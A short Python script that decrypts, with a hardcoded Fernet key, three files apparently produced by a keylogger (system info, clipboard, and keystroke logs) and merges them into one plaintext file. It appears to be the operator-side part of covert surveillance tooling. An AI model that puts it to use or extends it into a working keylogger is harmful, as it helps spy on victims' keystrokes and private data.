from cryptography.fernet import Fernet

key = "zcRoNqGOQi1gt-RhLadAWROlcEoEJJBBhauHRNctpvI="

system_information_e = 'e_systeminfo.txt'
clipboard_information_e = 'e_clipboard.txt'
keys_information_e = 'e_key_log.txt'



encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0


for decrypting_files in encrypted_files:

    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decrypted_information.txt", 'ab') as f:
        f.write(decrypted)

    count = count + 1